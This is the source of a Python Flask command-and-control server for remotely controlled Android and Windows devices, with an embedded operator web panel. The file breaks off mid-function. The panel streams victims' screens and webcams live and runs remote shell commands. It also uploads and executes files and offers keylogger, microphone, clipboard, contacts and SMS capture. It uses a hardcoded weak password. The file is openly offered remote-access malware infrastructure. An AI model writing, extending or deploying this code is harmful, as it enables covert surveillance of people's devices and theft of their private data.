#!/usr/bin/env python3
"""
C2 SERVER - Real-Time Screen & Camera Viewer
Android Compatible with Live Streaming
"""

from flask import Flask, request, jsonify, send_file, Response, render_template_string
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
import json
import cv2
import numpy as np
from collections import defaultdict
import io
from PIL import Image
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB

# SocketIO with eventlet for better performance
try:
    import eventlet
    eventlet.monkey_patch()
    socketio = SocketIO(app, 
                       cors_allowed_origins="*",
                       async_mode='eventlet',
                       ping_timeout=60,
                       ping_interval=25,
                       max_http_buffer_size=100 * 1024 * 1024)  # 100MB buffer for video
    logger.info("[*] Using eventlet for WebSocket support")
except ImportError:
    socketio = SocketIO(app, 
                       cors_allowed_origins="*",
                       async_mode='threading',
                       max_http_buffer_size=100 * 1024 * 1024)
    logger.info("[*] Using threading mode")

# Storage directories
for dir in ['uploads', 'downloads', 'screenshots', 'logs', 'videos', 'camera']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()
screen_streams = {}  # {client_id: {'active': bool, 'quality': int, 'fps': int}}
camera_streams = {}  # {client_id: {'active': bool, 'camera_id': 0}}
client_last_active = {}
live_screens = {}  # Store last screen frame per client
live_cameras = {}  # Store last camera frame per client

# Password for web control panel
WEB_PASSWORD = "admin123"  # CHANGE THIS!

print("""
╔══════════════════════════════════════════════════════╗
║      C2 REAL-TIME SCREEN & CAMERA VIEWER v3.0       ║
║      Live Screen Sharing + Camera Streaming         ║
║              Android & Windows Compatible           ║
╚══════════════════════════════════════════════════════╝
""")

# ============= WEB CONTROL PANEL WITH LIVE VIEW =============

@app.route('/')
def index():
    """Main web control panel with live screen view"""
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>C2 - Live Screen & Camera Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            max-width: 100%;
            margin: 0;
            padding: 0;
        }
        .top-bar {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            padding: 15px 30px;
            border-bottom: 2px solid #00aaff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .logo h1 {
            color: #00aaff;
            font-size: 1.8em;
            text-shadow: 0 0 15px rgba(0, 170, 255, 0.5);
        }
        .status-indicators {
            display: flex;
            gap: 20px;
            align-items: center;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9em;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        .online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .offline { background: #ff5555; box-shadow: 0 0 10px #ff5555; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .main-layout {
            display: grid;
            grid-template-columns: 300px 1fr;
            min-height: calc(100vh - 70px);
        }
        @media (max-width: 1200px) {
            .main-layout { grid-template-columns: 1fr; }
        }
        .sidebar {
            background: rgba(0, 0, 0, 0.8);
            border-right: 1px solid #223355;
            padding: 20px;
            overflow-y: auto;
        }
        .content-area {
            padding: 20px;
            overflow-y: auto;
        }
        .panel {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #334477;
        }
        .panel-title {
            color: #00aaff;
            font-size: 1.2em;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #00aaff;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .device-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .device-card {
            background: rgba(20, 30, 60, 0.7);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            border: 1px solid #445588;
            transition: all 0.3s;
            cursor: pointer;
        }
        .device-card:hover {
            border-color: #00aaff;
            background: rgba(30, 40, 80, 0.8);
            transform: translateX(5px);
        }
        .device-card.selected {
            border-color: #00ffaa;
            background: rgba(20, 60, 40, 0.8);
        }
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .device-name {
            font-weight: bold;
            color: #88ddff;
            font-size: 1.1em;
        }
        .device-status {
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
        }
        .online-badge { background: rgba(0, 255, 0, 0.2); color: #00ff00; border: 1px solid #00ff00; }
        .offline-badge { background: rgba(255, 0, 0, 0.2); color: #ff5555; border: 1px solid #ff5555; }
        .device-info {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
            font-size: 0.85em;
            color: #aaccff;
        }
        .device-actions {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-top: 10px;
        }
        .btn {
            padding: 8px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            font-size: 0.85em;
            text-align: center;
        }
        .btn-primary {
            background: linear-gradient(135deg, #00aaff, #0088cc);
            color: white;
        }
        .btn-primary:hover {
            background: linear-gradient(135deg, #00bbff, #0099dd);
            box-shadow: 0 0 10px rgba(0, 170, 255, 0.5);
        }
        .btn-success {
            background: linear-gradient(135deg, #00aa55, #008844);
            color: white;
        }
        .btn-success:hover {
            background: linear-gradient(135deg, #00bb66, #009955);
            box-shadow: 0 0 10px rgba(0, 170, 85, 0.5);
        }
        .btn-danger {
            background: linear-gradient(135deg, #ff5555, #cc0000);
            color: white;
        }
        .btn-danger:hover {
            background: linear-gradient(135deg, #ff6666, #dd0000);
            box-shadow: 0 0 10px rgba(255, 85, 85, 0.5);
        }
        .btn-warning {
            background: linear-gradient(135deg, #ffaa00, #cc8800);
            color: white;
        }
        .btn-warning:hover {
            background: linear-gradient(135deg, #ffbb00, #dd9900);
            box-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
        }
        .live-view-container {
            background: rgba(0, 0, 0, 0.9);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 2px solid #00aaff;
            box-shadow: 0 0 30px rgba(0, 170, 255, 0.3);
        }
        .live-view-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .view-switcher {
            display: flex;
            gap: 10px;
        }
        .view-btn {
            padding: 8px 20px;
            background: rgba(0, 100, 200, 0.3);
            border: 1px solid #3366aa;
            border-radius: 6px;
            color: #88ccff;
            cursor: pointer;
            transition: all 0.3s;
        }
        .view-btn.active {
            background: linear-gradient(135deg, #00aaff, #0088cc);
            color: white;
            border-color: #00aaff;
        }
        .view-btn:hover:not(.active) {
            background: rgba(0, 120, 240, 0.4);
            border-color: #00aaff;
        }
        .live-display {
            background: #000000;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            min-height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .live-video {
            width: 100%;
            max-height: 70vh;
            object-fit: contain;
        }
        .no-stream {
            color: #8888ff;
            font-size: 1.2em;
            text-align: center;
            padding: 40px;
        }
        .stream-info {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.7);
            padding: 8px 15px;
            border-radius: 6px;
            font-size: 0.9em;
            color: #88ff88;
        }
        .stream-controls {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            justify-content: center;
        }
        .control-btn {
            padding: 10px 20px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .command-panel {
            display: grid;
            grid-template-columns: 1fr auto;
            gap: 10px;
            margin-top: 20px;
        }
        .command-input {
            padding: 12px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #445588;
            border-radius: 8px;
            color: #ffffff;
            font-family: monospace;
            font-size: 1em;
        }
        .command-input:focus {
            outline: none;
            border-color: #00aaff;
            box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        .quick-btn {
            padding: 10px;
            background: rgba(0, 100, 200, 0.3);
            border: 1px solid #3366aa;
            border-radius: 6px;
            color: #88ccff;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            font-size: 0.9em;
        }
        .quick-btn:hover {
            background: rgba(0, 120, 240, 0.4);
            border-color: #00aaff;
        }
        .output-panel {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #334477;
        }
        .output-title {
            color: #00aaff;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
        }
        .output-content {
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            color: #88ff88;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: linear-gradient(135deg, #0a0a1a, #1a1a3a);
            padding: 30px;
            border-radius: 15px;
            border: 2px solid #00aaff;
            max-width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 0 50px rgba(0, 170, 255, 0.5);
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            z-index: 3000;
            animation: slideIn 0.3s ease;
            backdrop-filter: blur(10px);
        }
        .success { background: linear-gradient(135deg, #00aa00, #008800); border: 1px solid #00ff00; }
        .error { background: linear-gradient(135deg, #aa0000, #880000); border: 1px solid #ff0000; }
        .info { background: linear-gradient(135deg, #0088aa, #006688); border: 1px solid #00aaff; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .quality-controls {
            display: flex;
            gap: 10px;
            align-items: center;
            margin-top: 10px;
        }
        .quality-btn {
            padding: 5px 15px;
            border-radius: 4px;
            background: rgba(0, 100, 200, 0.3);
            border: 1px solid #3366aa;
            color: #88ccff;
            cursor: pointer;
        }
        .quality-btn.active {
            background: linear-gradient(135deg, #00aaff, #0088cc);
            color: white;
        }
        .fullscreen-btn {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            border: 1px solid #00aaff;
            border-radius: 4px;
            padding: 8px 15px;
            cursor: pointer;
            z-index: 100;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .stat-box {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            border: 1px solid #334477;
        }
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ffaa;
            text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
        }
        .stat-label {
            color: #aaddff;
            font-size: 0.9em;
            margin-top: 5px;
        }
        .mobile-warning {
            display: none;
            background: rgba(255, 200, 0, 0.2);
            border: 1px solid #ffaa00;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            color: #ffdd00;
            text-align: center;
        }
        @media (max-width: 768px) {
            .mobile-warning { display: block; }
            .top-bar { padding: 10px 15px; }
            .logo h1 { font-size: 1.4em; }
            .main-layout { grid-template-columns: 1fr; }
            .sidebar { border-right: none; border-bottom: 1px solid #223355; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="top-bar">
            <div class="logo">
                <h1>🎥 C2 Live Control</h1>
            </div>
            <div class="status-indicators">
                <div class="status-item">
                    <div class="status-dot online" id="connection-dot"></div>
                    <span id="connection-status">Connected</span>
                </div>
                <div class="status-item">
                    <div class="status-dot" id="stream-dot"></div>
                    <span id="stream-status">No Stream</span>
                </div>
                <div class="status-item">
                    <span id="device-count">0 Devices</span>
                </div>
            </div>
        </div>
        
        <div class="mobile-warning">
            ⚠️ For best experience, use landscape mode on mobile devices
        </div>
        
        <div class="main-layout">
            <!-- Sidebar: Device List -->
            <div class="sidebar">
                <div class="panel">
                    <div class="panel-title">
                        📱 Connected Devices
                        <button onclick="refreshDevices()" class="btn btn-primary" style="padding: 5px 10px; font-size: 0.8em;">Refresh</button>
                    </div>
                    <div class="device-list" id="device-list">
                        <div style="text-align:center;padding:30px;color:#8888ff;">
                            No devices connected...
                        </div>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-title">⚡ Quick Actions</div>
                    <div class="quick-commands">
                        <button onclick="quickAction('sysinfo')" class="quick-btn">System Info</button>
                        <button onclick="quickAction('screenshot')" class="quick-btn">Screenshot</button>
                        <button onclick="quickAction('webcam')" class="quick-btn">Webcam</button>
                        <button onclick="quickAction('mic')" class="quick-btn">Microphone</button>
                        <button onclick="quickAction('location')" class="quick-btn">Location</button>
                        <button onclick="quickAction('files')" class="quick-btn">File Browser</button>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-title">📊 Statistics</div>
                    <div class="stats-grid">
                        <div class="stat-box">
                            <div class="stat-value" id="total-devices">0</div>
                            <div class="stat-label">Devices</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="online-devices">0</div>
                            <div class="stat-label">Online</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="total-streams">0</div>
                            <div class="stat-label">Streams</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-value" id="uptime">0s</div>
                            <div class="stat-label">Uptime</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Main Content Area -->
            <div class="content-area">
                <!-- Live View Panel -->
                <div class="live-view-container">
                    <div class="live-view-header">
                        <div class="panel-title">🎬 Live View</div>
                        <div class="view-switcher">
                            <button class="view-btn active" onclick="switchView('screen')">Screen</button>
                            <button class="view-btn" onclick="switchView('camera')">Camera</button>
                            <button class="view-btn" onclick="switchView('both')">Both</button>
                        </div>
                    </div>
                    
                    <div class="live-display" id="live-display">
                        <div class="no-stream" id="no-stream">
                            Select a device and start streaming to see live video
                        </div>
                        <img id="live-screen" class="live-video" style="display:none;">
                        <img id="live-camera" class="live-video" style="display:none;">
                        <div class="stream-info" id="stream-info" style="display:none;">
                            <div>FPS: <span id="stream-fps">0</span></div>
                            <div>Quality: <span id="stream-quality">Medium</span></div>
                            <div>Delay: <span id="stream-delay">0ms</span></div>
                        </div>
                        <button class="fullscreen-btn" onclick="toggleFullscreen()" style="display:none;">⛶ Fullscreen</button>
                    </div>
                    
                    <div class="stream-controls">
                        <button id="start-screen-btn" onclick="startScreenStream()" class="control-btn btn-success">
                            ▶ Start Screen
                        </button>
                        <button id="stop-screen-btn" onclick="stopScreenStream()" class="control-btn btn-danger" style="display:none;">
                            ⏹ Stop Screen
                        </button>
                        <button id="start-camera-btn" onclick="startCameraStream()" class="control-btn btn-success">
                            📷 Start Camera
                        </button>
                        <button id="stop-camera-btn" onclick="stopCameraStream()" class="control-btn btn-danger" style="display:none;">
                            ⏹ Stop Camera
                        </button>
                    </div>
                    
                    <div class="quality-controls">
                        <span style="color:#88ddff;">Quality:</span>
                        <button class="quality-btn active" onclick="setStreamQuality('low')">Low</button>
                        <button class="quality-btn" onclick="setStreamQuality('medium')">Medium</button>
                        <button class="quality-btn" onclick="setStreamQuality('high')">High</button>
                        <span style="margin-left:15px;color:#88ddff;">FPS:</span>
                        <button class="quality-btn active" onclick="setStreamFPS(5)">5 FPS</button>
                        <button class="quality-btn" onclick="setStreamFPS(15)">15 FPS</button>
                        <button class="quality-btn" onclick="setStreamFPS(30)">30 FPS</button>
                    </div>
                </div>
                
                <!-- Command Panel -->
                <div class="panel">
                    <div class="panel-title">💻 Remote Command</div>
                    <div class="command-panel">
                        <input type="text" 
                               id="command-input" 
                               class="command-input" 
                               placeholder="Enter command (e.g., ls, ipconfig, whoami)..."
                               onkeypress="if(event.key === 'Enter') sendCommand()">
                        <button onclick="sendCommand()" class="btn btn-primary" style="padding:12px 30px;">Execute</button>
                    </div>
                    
                    <div class="quick-commands">
                        <button onclick="sendQuickCommand('tasklist')" class="quick-btn">Process List</button>
                        <button onclick="sendQuickCommand('ipconfig /all')" class="quick-btn">Network Info</button>
                        <button onclick="sendQuickCommand('dir')" class="quick-btn">List Files</button>
                        <button onclick="sendQuickCommand('systeminfo')" class="quick-btn">System Info</button>
                        <button onclick="sendQuickCommand('getmac')" class="quick-btn">MAC Address</button>
                        <button onclick="sendQuickCommand('wmic diskdrive get size')" class="quick-btn">Disk Info</button>
                        <button onclick="sendQuickCommand('netstat -an')" class="quick-btn">Connections</button>
                        <button onclick="sendQuickCommand('ps')" class="quick-btn">Processes (Linux)</button>
                    </div>
                </div>
                
                <!-- Output Panel -->
                <div class="output-panel">
                    <div class="output-title">
                        <span>📄 Command Output</span>
                        <button onclick="clearOutput()" class="btn btn-danger" style="padding:5px 10px;font-size:0.8em;">Clear</button>
                    </div>
                    <div class="output-content" id="command-output">
                        <!-- Output will appear here -->
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal for Advanced Controls -->
    <div id="advanced-modal" class="modal">
        <div class="modal-content">
            <h2 style="color:#00aaff;margin-bottom:20px;">Advanced Device Control</h2>
            <div id="modal-device-info"></div>
            <div style="margin:20px 0;">
                <h3 style="color:#88ddff;margin-bottom:10px;">File Operations</h3>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                    <button onclick="fileOperation('upload')" class="btn btn-primary">📤 Upload File</button>
                    <button onclick="fileOperation('download')" class="btn btn-success">📥 Download File</button>
                    <button onclick="fileOperation('browse')" class="btn btn-primary">📁 File Browser</button>
                    <button onclick="fileOperation('execute')" class="btn btn-warning">⚡ Execute File</button>
                </div>
            </div>
            <div style="margin:20px 0;">
                <h3 style="color:#88ddff;margin-bottom:10px;">System Control</h3>
                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
                    <button onclick="systemAction('lock')" class="btn btn-warning">🔒 Lock Screen</button>
                    <button onclick="systemAction('shutdown')" class="btn btn-danger">⏻ Shutdown</button>
                    <button onclick="systemAction('restart')" class="btn btn-danger">↻ Restart</button>
                    <button onclick="systemAction('logout')" class="btn btn-warning">🚪 Logout</button>
                    <button onclick="systemAction('suspend')" class="btn btn-warning">⏾ Suspend</button>
                    <button onclick="systemAction('volume')" class="btn btn-primary">🔊 Volume</button>
                </div>
            </div>
            <div style="margin:20px 0;">
                <h3 style="color:#88ddff;margin-bottom:10px;">Surveillance</h3>
                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
                    <button onclick="surveillanceAction('keylogger')" class="btn btn-danger">⌨️ Keylogger</button>
                    <button onclick="surveillanceAction('microphone')" class="btn btn-danger">🎤 Microphone</button>
                    <button onclick="surveillanceAction('clipboard')" class="btn btn-warning">📋 Clipboard</button>
                    <button onclick="surveillanceAction('notifications')" class="btn btn-warning">🔔 Notifications</button>
                    <button onclick="surveillanceAction('contacts')" class="btn btn-warning">👥 Contacts</button>
                    <button onclick="surveillanceAction('sms')" class="btn btn-warning">📱 SMS</button>
                </div>
            </div>
            <div style="text-align:center;margin-top:20px;">
                <button onclick="closeModal()" class="btn btn-danger" style="padding:10px 30px;">Close</button>
            </div>
        </div>
    </div>
    
    <!-- Notification System -->
    <div id="notification" class="notification" style="display:none;"></div>
    
    <!-- WebSocket Connection -->
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        // Global variables
        let socket = null;
        let selectedDeviceId = null;
        let currentView = 'screen';
        let streamQuality = 'medium';
        let streamFPS = 15;
        let serverStartTime = Date.now();
        let devices = {};
        let screenStreamActive = false;
        let cameraStreamActive = false;
        let lastFrameTime = {};
        let fpsCounter = {};
        
        // Initialize WebSocket connection
        function initWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = protocol + '//' + window.location.host;
            
            socket = io(wsUrl, {
                transports: ['websocket', 'polling'],
                reconnection: true,
                reconnectionAttempts: 10,
                reconnectionDelay: 1000,
                maxHttpBufferSize: 100e6 // 100MB buffer for video
            });
            
            socket.on('connect', () => {
                showNotification('Connected to C2 server', 'success');
                updateConnectionStatus('connected');
                socket.emit('controller_connect');
            });
            
            socket.on('disconnect', () => {
                showNotification('Disconnected from server', 'error');
                updateConnectionStatus('disconnected');
            });
            
            // Handle incoming events
            socket.on('client_online', (data) => {
                addOrUpdateDevice(data);
                showNotification(`📱 ${data.hostname} connected`, 'info');
            });
            
            socket.on('client_offline', (data) => {
                updateDeviceStatus(data.client_id, false);
                showNotification(`📱 Device ${data.client_id} disconnected`, 'error');
            });
            
            socket.on('command_result', (data) => {
                addToOutput(data);
            });
            
            socket.on('screen_frame', (data) => {
                handleScreenFrame(data);
            });
            
            socket.on('camera_frame', (data) => {
                handleCameraFrame(data);
            });
            
            socket.on('stream_status', (data) => {
                updateStreamStatus(data);
            });
            
            socket.on('file_transfer', (data) => {
                handleFileTransfer(data);
            });
            
            socket.on('alert', (data) => {
                showNotification(`⚠️ ${data.client_id}: ${data.message}`, 'error');
            });
        }
        
        // Device management
        function addOrUpdateDevice(device) {
            devices[device.client_id] = device;
            renderDeviceList();
            updateStats();
        }
        
        function renderDeviceList() {
            const list = document.getElementById('device-list');
            const onlineDevices = Object.values(devices).filter(d => d.online);
            
            if (onlineDevices.length === 0) {
                list.innerHTML = '<div style="text-align:center;padding:30px;color:#8888ff;">No devices connected...</div>';
                return;
            }
            
            list.innerHTML = onlineDevices.map(device => `
                <div class="device-card ${selectedDeviceId === device.client_id ? 'selected' : ''}" 
                     onclick="selectDevice('${device.client_id}')" 
                     id="device-${device.client_id}">
                    <div class="device-header">
                        <div class="device-name">${device.hostname || device.client_id}</div>
                        <div class="device-status online-badge">ONLINE</div>
                    </div>
                    <div class="device-info">
                        <div>👤 ${device.username || 'Unknown'}</div>
                        <div>💻 ${device.os || 'Unknown'}</div>
                        <div>🌐 ${device.ip || 'Unknown'}</div>
                        <div>📱 ${device.platform || 'Unknown'}</div>
                    </div>
                    <div class="device-actions">
                        <button onclick="event.stopPropagation(); controlDevice('${device.client_id}')" class="btn btn-primary">Control</button>
                        <button onclick="event.stopPropagation(); startScreenStreamFor('${device.client_id}')" class="btn btn-success">Screen</button>
                        <button onclick="event.stopPropagation(); startCameraStreamFor('${device.client_id}')" class="btn btn-warning">Camera</button>
                    </div>
                </div>
            `).join('');
        }
        
        function selectDevice(deviceId) {
            selectedDeviceId = deviceId;
            renderDeviceList();
            
            // Update selected device display
            const device = devices[deviceId];
            if (device) {
                document.getElementById('selected-device').innerHTML = `
                    <strong>${device.hostname}</strong> (${device.os})<br>
                    <small>${device.username} @ ${device.ip}</small>
                `;
            }
            
            showNotification(`Selected device: ${device?.hostname || deviceId}`, 'info');
        }
        
        function updateDeviceStatus(deviceId, isOnline) {
            if (devices[deviceId]) {
                devices[deviceId].online = isOnline;
                renderDeviceList();
                updateStats();
            }
        }
        
        function refreshDevices() {
            socket.emit('get_devices');
            showNotification('Refreshing device list...', 'info');
        }
        
        // Stream handling
        function handleScreenFrame(data) {
            if (data.client_id !== selectedDeviceId) return;
            
            const img = document.getElementById('live-screen');
            if (img) {
                img.src = 'data:image/jpeg;base64,' + data.frame;
                img.style.display = currentView === 'screen' || currentView === 'both' ? 'block' : 'none';
                document.getElementById('no-stream').style.display = 'none';
                document.getElementById('stream-info').style.display = 'block';
                
                // Calculate FPS
                const now = Date.now();
                if (!lastFrameTime[data.client_id]) lastFrameTime[data.client_id] = now;
                const fps = Math.round(1000 / (now - lastFrameTime[data.client_id]));
                lastFrameTime[data.client_id] = now;
                
                // Update FPS counter
                if (!fpsCounter[data.client_id]) fpsCounter[data.client_id] = [];
                fpsCounter[data.client_id].push(fps);
                if (fpsCounter[data.client_id].length > 10) fpsCounter[data.client_id].shift();
                const avgFPS = Math.round(fpsCounter[data.client_id].reduce((a,b) => a+b, 0) / fpsCounter[data.client_id].length);
                
                document.getElementById('stream-fps').textContent = avgFPS;
                document.getElementById('stream-delay').textContent = (Date.now() - data.timestamp) + 'ms';
                updateStreamDot('active');
            }
        }
        
        function handleCameraFrame(data) {
            if (data.client_id !== selectedDeviceId) return;
            
            const img = document.getElementById('live-camera');
            if (img) {
                img.src = 'data:image/jpeg;base64,' + data.frame;
                img.style.display = currentView === 'camera' || currentView === 'both' ? 'block' : 'none';
                document.getElementById('no-stream').style.display = 'none';
                document.getElementById('stream-info').style.display = 'block';
                updateStreamDot('active');
            }
        }
        
        function startScreenStream() {
            if (!selectedDeviceId) {
                showNotification('Please select a device first', 'error');
                return;
            }
            
            socket.emit('start_screen_stream', {
                client_id: selectedDeviceId,
                quality: streamQuality,
                fps: streamFPS
            });
            
            screenStreamActive = true;
            document.getElementById('start-screen-btn').style.display = 'none';
            document.getElementById('stop-screen-btn').style.display = 'inline-block';
            showNotification('Starting screen stream...', 'info');
        }
        
        function stopScreenStream() {
            if (!selectedDeviceId) return;
            
            socket.emit('stop_screen_stream', { client_id: selectedDeviceId });
            screenStreamActive = false;
            document.getElementById('start-screen-btn').style.display = 'inline-block';
            document.getElementById('stop-screen-btn').style.display = 'none';
            document.getElementById('live-screen').style.display = 'none';
            showNotification('Screen stream stopped', 'info');
        }
        
        function startCameraStream() {
            if (!selectedDeviceId) {
                showNotification('Please select a device first', 'error');
                return;
            }
            
            socket.emit('start_camera_stream', {
                client_id: selectedDeviceId,
                quality: streamQuality,
                fps: streamFPS,
                camera_id: 0
            });
            
            cameraStreamActive = true;
            document.getElementById('start-camera-btn').style.display = 'none';
            document.getElementById('stop-camera-btn').style.display = 'inline-block';
            showNotification('Starting camera stream...', 'info');
        }
        
        function stopCameraStream() {
            if (!selectedDeviceId) return;
            
            socket.emit('stop_camera_stream', { client_id: selectedDeviceId });
            cameraStreamActive = false;
            document.getElementById('start-camera-btn').style.display = 'inline-block';
            document.getElementById('stop-camera-btn').style.display = 'none';
            document.getElementById('live-camera').style.display = 'none';
            showNotification('Camera stream stopped', 'info');
        }
        
        function startScreenStreamFor(deviceId) {
            selectDevice(deviceId);
            setTimeout(() => startScreenStream(), 100);
        }
        
        function startCameraStreamFor(deviceId) {
            selectDevice(deviceId);
            setTimeout(() => startCameraStream(), 100);
        }
        
        function switchView(view) {
            currentView = view;
            
            // Update button states
            document.querySelectorAll('.view-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Update display
            const screen = document.getElementById('live-screen');
            const camera = document.getElementById('live-camera');
            const noStream = document.getElementById('no-stream');
            
            if (view === 'screen') {
                if (screenStreamActive && screen.src) {
                    screen.style.display = 'block';
                    camera.style.display = 'none';
                    noStream.style.display = 'none';
                } else {
                    noStream.style.display = 'block';
                    noStream.innerHTML = 'Screen stream not active. Click "Start Screen" to begin.';
                }
            } else if (view === 'camera') {
                if (cameraStreamActive && camera.src) {
                    screen.style.display = 'none';
                    camera.style.display = 'block';
                    noStream.style.display = 'none';
                } else {
                    noStream.style.display = 'block';
                    noStream.innerHTML = 'Camera stream not active. Click "Start Camera" to begin.';
                }
            } else if (view === 'both') {
                if ((screenStreamActive && screen.src) || (cameraStreamActive && camera.src)) {
                    screen.style.display = screenStreamActive && screen.src ? 'block' : 'none';
                    camera.style.display = cameraStreamActive && camera.src ? 'block' : 'none';
                    noStream.style.display = 'none';
                } else {
                    noStream.style.display = 'block';
                }
            }
        }
        
        function setStreamQuality(quality) {
            streamQuality = quality;
            document.querySelectorAll('.quality-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            if (selectedDeviceId) {
                if (screenStreamActive) {
                    socket.emit('update_stream_settings', {
                        client_id: selectedDeviceId,
                        quality: quality,
                        fps: streamFPS,
                        stream_type: 'screen'
                    });
                }
                if (cameraStreamActive) {
                    socket.emit('update_stream_settings', {
                        client_id: selectedDeviceId,
                        quality: quality,
                        fps: streamFPS,
                        stream_type: 'camera'
                    });
                }
            }
            
            document.getElementById('stream-quality').textContent = quality.charAt(0).toUpperCase() + quality.slice(1);
            showNotification(`Stream quality set to ${quality}`, 'info');
        }
        
        function setStreamFPS(fps) {
            streamFPS = fps;
            document.querySelectorAll('.quality-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            if (selectedDeviceId) {
                if (screenStreamActive) {
                    socket.emit('update_stream_settings', {
                        client_id: selectedDeviceId,
                        quality: streamQuality,
                        fps: fps,
                        stream_type: 'screen'
                    });
                }
                if (cameraStreamActive) {
                    socket.emit('update_stream_settings', {
                        client_id: selectedDeviceId,
                        quality: streamQuality,
                        fps: fps,
                        stream_type: 'camera'
                    });
                }
            }
            
            showNotification(`Stream FPS set to ${fps}`, 'info');
        }
        
        // Command execution
        function sendCommand() {
            if (!selectedDeviceId) {
                showNotification('Please select a device first', 'error');
                return;
            }
            
            const command = document.getElementById('command-input').value.trim();
            if (!command) {
                showNotification('Please enter a command', 'error');
                return;
            }
            
            socket.emit('execute_command', {
                client_id: selectedDeviceId,
                command: command
            });
            
            addToOutput({
                client_id: selectedDeviceId,
                command: command,
                output: 'Command sent...',
